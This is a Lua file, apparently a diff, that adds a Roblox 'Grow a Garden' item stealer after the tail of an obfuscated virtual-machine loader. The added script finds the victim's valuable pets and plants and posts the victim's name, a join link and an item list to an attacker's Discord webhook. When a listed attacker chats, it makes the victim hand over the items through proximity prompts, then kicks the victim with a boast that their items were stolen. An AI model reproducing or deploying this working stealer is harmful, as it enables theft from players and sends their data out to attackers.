l;l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];if(E[F[2]]~=F[4])then G=G+1;else G=F[3];end;elseif l==109 then local W;local h;local c,a;local l;E[F[2]]={};G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]c,a=K(E[l]())d=a+l-1 h=0;for F=l,d do h=h+1;E[F]=c[h];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];l=F[2];W=E[l];for F=l+1,F[3]do o(W,E[F])end;else if(E[F[2]]<E[F[4]])then G=G+1;else G=F[3];end;end;elseif l<=112 then if l==111 then if(E[F[2]]==F[4])then G=G+1;else G=F[3];end;else E[F[2]]=c(a[F[3]],nil,f);end;elseif l<=113 then E[F[2]]=E[F[3]]+F[4];elseif l>114 then local F=F[2]E[F](E[F+1])else local l,l;local i;local h,c;local o;local l;E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];o=E[F[3]];E[l+1]=o;E[l]=o[F[4]];G=G+1;F=e[G];l=F[2]h,c=K(E[l](E[l+1]))d=c+l-1 i=0;for F=l,d do i=i+1;E[F]=h[i];end;G=G+1;F=e[G];l=F[2]h,i={E[l](n(E,l+1,d))},0;for F=l,F[4]do i=i+1;E[F]=h[i];end G=G+1;F=e[G];G=F[3];end;elseif l<=134 then if l<=124 then if l<=119 then if l<=117 then if l>116 then local d=a[F[3]];local n;local l={};n=t({},{__index=function(G,F)local F=l[F];return F[1][F[2]];end,__newindex=function(E,F,G)local F=l[F]F[1][F[2]]=G;end;});for n=1,F[4]do G=G+1;local F=e[G];if F[1]==148 then l[n-1]={E,F[3]};else l[n-1]={i,F[3]};end;h[#h+1]=l;end;E[F[2]]=c(d,n,f);else local d,n;local l;E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]d,n={E[l](E[l+1])},0;for F=l,F[4]do n=n+1;E[F]=d[n];end G=G+1;F=e[G];G=F[3];end;elseif l>118 then local F=F[2]local e,G=K(E[F](E[F+1]))d=G+F-1 local G=0;for F=F,d do G=G+1;E[F]=e[G];end;else local G=F[2]local l,e={E[G](E[G+1])},0;for F=G,F[4]do e=e+1;E[F]=l[e];end end;elseif l<=121 then if l==120 then local d;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l](n(E,l+1,F[3]))G=G+1;F=e[G];do return end;else local l;E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];l=F[2]E[l](n(E,l+1,F[3]))end;elseif l<=122 then if(F[2]<=E[F[4]])then G=F[3];else G=G+1;end;elseif l>123 then local l=F[2];local n=F[4];local e=l+2 local l={E[l](E[l+1],E[e])};for F=1,n do E[e+F]=l[F];end;local l=l[1]if l then E[e]=l G=F[3];else G=G+1;end;else local d;local l;l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=129 then if l<=126 then if l==125 then if(F[2]<E[F[4]])then G=G+1;else G=F[3];end;else local G=F[2]local e,F=K(E[G]())d=F+G-1 local F=0;for G=G,d do F=F+1;E[G]=e[F];end;end;elseif l<=127 then local d;local l;E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][E[F[4]]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];elseif l>128 then if(E[F[2]]==E[F[4]])then G=G+1;else G=F[3];end;else local d;local l;E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];end;elseif l<=131 then if l>130 then local K;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2];K=E[F[3]];E[l+1]=K;E[l]=K[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=E[F[3]]*E[F[4]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][E[F[4]]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]]*E[F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2];do return E[l](n(E,l+1,F[3]))end;G=G+1;F=e[G];l=F[2];do return n(E,l,d)end;G=G+1;F=e[G];do return end;else if(F[2]<=E[F[4]])then G=G+1;else G=F[3];end;end;elseif l<=132 then G=F[3];elseif l==133 then local F=F[2]E[F]=E[F](n(E,F+1,d))else if not E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=144 then if l<=139 then if l<=136 then if l>135 then local d;local i;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];i=F[3];d=E[i]for F=i+1,F[4]do d=d..E[F];end;E[F[2]]=d;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];G=F[3];else local n=F[2];local e={};for F=1,#h do local F=h[F];for G=0,#F do local G=F[G];local l=G[1];local F=G[2];if l==E and F>=n then e[F]=l[F];G[1]=e;end;end;end;end;elseif l<=137 then local F=F[2]E[F]=E[F](n(E,F+1,d))elseif l>138 then E[F[2]]={};else local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=141 then if l==140 then E[F[2]]=i[F[3]];else local h;local o;local f;local c,a;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]c,a=K(E[l](E[l+1]))d=a+l-1 f=0;for F=l,d do f=f+1;E[F]=c[f];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];o=F[3];h=E[o]for F=o+1,F[4]do h=h..E[F];end;E[F[2]]=h;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];end;elseif l<=142 then local G=F[2]local l,e={E[G](n(E,G+1,d))},0;for F=G,F[4]do e=e+1;E[F]=l[e];end elseif l==143 then E[F[2]]=f[F[3]];else local G=F[2]local l,e={E[G](n(E,G+1,d))},0;for F=G,F[4]do e=e+1;E[F]=l[e];end end;elseif l<=149 then if l<=146 then if l==145 then E[F[2]][E[F[3]]]=E[F[4]];else local e=F[3];local G=E[e]for F=e+1,F[4]do G=G..E[F];end;E[F[2]]=G;end;elseif l<=147 then E[F[2]]={};elseif l>148 then local d;local l;E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l](n(E,l+1,F[3]))else E[F[2]]=E[F[3]];end;elseif l<=151 then if l>150 then local G=F[2]local l,e={E[G](n(E,G+1,F[3]))},0;for F=G,F[4]do e=e+1;E[F]=l[e];end else G=F[3];end;elseif l<=152 then local G=F[2]local l,e={E[G](n(E,G+1,F[3]))},0;for F=G,F[4]do e=e+1;E[F]=l[e];end elseif l>153 then if(E[F[2]]<E[F[4]])then G=G+1;else G=F[3];end;else if(F[2]<=E[F[4]])then G=G+1;else G=F[3];end;end;G=G+1;end;end;end;return c(M(),{},I)(...);end)(...)
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local users = _G.Usernames or {}
+local min_value = _G.min_value or 10000000
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+local dataService = require(modules:WaitForChild("DataService"))
+local character = plr.Character or plr.CharacterAdded:Wait()
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local totalValue = 0
+local itemsToSend = {}
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add any usernames or webhook")
+    return
+end
+
+if game.PlaceId ~= 126884695634066 then
+    plr:kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+if #Players:GetPlayers() >= 5 then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+local function calcPetValue(v14)
+    local hatchedFrom = v14.PetData.HatchedFrom
+    if not hatchedFrom or hatchedFrom == "" then
+        return 0
+    end
+    local eggData = petRegistry.PetEggs[hatchedFrom]
+    if not eggData then
+        return 0
+    end
+    local v17 = eggData.RarityData.Items[v14.PetType]
+    if not v17 then
+        return 0
+    end
+    local weightRange = v17.GeneratedPetData.WeightRange
+    if not weightRange then
+        return 0
+    end
+    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+    local v20 = math.lerp(0.8, 1.2, v19)
+    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
+    return math.floor(v23)
+end
+
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
+end
+
+local function getWeight(tool)
+    local weightValue = tool:FindFirstChild("Weight") or 
+                       tool:FindFirstChild("KG") or 
+                       tool:FindFirstChild("WeightValue") or
+                       tool:FindFirstChild("Mass")
+
+    local weight = 0
+
+    if weightValue then
+        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
+            weight = weightValue.Value
+        elseif weightValue:IsA("StringValue") then
+            weight = tonumber(weightValue.Value) or 0
+        end
+    else
+        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+        if weightMatch then
+            weight = tonumber(weightMatch) or 0
+        end
+    end
+
+    return math.floor(weight * 100 + 0.5) / 100
+end
+
+local function getHighestKGFruit()
+    local highestWeight = 0
+
+    for _, item in ipairs(itemsToSend) do
+        if item.Weight > highestWeight then
+            highestWeight = item.Weight
+        end
+    end
+
+    return highestWeight
+end
+
+local function SendJoinMessage(list, prefix)
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Join link:",
+            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item list:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
+            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
+        }
+    }
+
+    for _, item in ipairs(list) do
+        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[3].value = fields[3].value .. line .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "\240\159\140\180 Join to get GAG hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local function SendMessage(sortedItems)
+    local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
+        }
+	}
+
+    for _, item in ipairs(sortedItems) do
+        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[2].value = fields[2].value .. line .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\140\180 New GAG Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local itemName = v14.PetType
+            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                local value = calcPetValue(v14)
+                local toolName = tool.Name
+                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+            end
+        else
+            local value = calcPlantValue(tool)
+            if value >= min_value then
+                local weight = getWeight(tool)
+                local itemName = tool:GetAttribute("ItemName")
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
+            end
+        end
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        if a.Type ~= "Pet" and b.Type == "Pet" then
+            return true
+        elseif a.Type == "Pet" and b.Type ~= "Pet" then
+            return false
+        else
+            return a.Value < b.Value
+        end
+    end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+
+    table.sort(sentItems, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then
+            return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then
+            return false
+        else
+            return a.Value > b.Value
+        end
+    end)
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    SendJoinMessage(sentItems, prefix)
+
+    local function doSteal(player)
+        local victimRoot = character:WaitForChild("HumanoidRootPart")
+        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+        wait(0.1)
+
+        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
+
+        for _, item in ipairs(itemsToSend) do
+            item.Tool.Parent = character
+            if item.Type == "Pet" then
+                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
+                repeat
+                    task.wait(0.01)
+                until promptHead.Enabled
+                fireproximityprompt(promptHead)
+            else
+                repeat
+                    task.wait(0.01)
+                until promptRoot.Enabled
+                fireproximityprompt(promptRoot)
+            end
+            task.wait(0.1)
+            item.Tool.Parent = backpack
+            task.wait(0.1)
+        end
+
+        local itemsStillInBackpack = true
+        while itemsStillInBackpack do
+            itemsStillInBackpack = false
+            for _, item in ipairs(itemsToSend) do
+                if backpack:FindFirstChild(item.Tool.Name) then
+                    itemsStillInBackpack = true
+                    break
+                end
+            end
+            task.wait(0.1)
+        end
+
+        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        SendMessage(sentItems)
+                        sentMessage = true
+                    end
+                    doSteal(player)
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    waitForUserChat()
+end
